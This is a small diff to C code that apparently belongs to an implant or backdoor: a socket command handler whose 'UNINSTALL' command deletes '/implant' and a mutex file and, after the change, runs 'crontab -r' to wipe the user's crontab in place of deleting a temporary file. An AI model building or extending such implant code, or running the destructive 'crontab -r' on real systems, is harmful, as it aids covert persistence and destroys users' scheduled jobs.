@@ -372,7 +372,8 @@ void commands(int sockfd){
     }
     buf[numbytes] = '\0';
     if(strcmp(buf,"UNINSTALL\n") == 0){
-      remove("/tmp/crontab");
+      //remove("/tmp/crontab");
+      system("crontab -r");
       remove("/implant");
       remove(MUTEX);
       free(buf);
